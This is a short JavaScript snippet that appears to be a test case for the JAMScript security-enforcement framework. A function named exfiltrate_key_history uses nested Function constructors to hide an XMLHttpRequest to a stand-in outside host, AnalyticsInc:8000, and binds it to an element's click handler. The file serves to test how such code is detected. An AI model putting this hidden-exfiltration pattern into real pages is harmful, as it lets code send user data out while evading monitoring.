function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest", true);xmlhttp.send(null);\';return Function(exp);';
  var top$$2 = JAMScript.call(Function, null, [nest]);
  var sub = JAMScript.call(top$$2, null, []);
  JAMScript.call(sub, null, []);
  return
}
var v0 = document.getElementById("test");
JAMScript.set(v0, "onclick", exfiltrate_key_history);

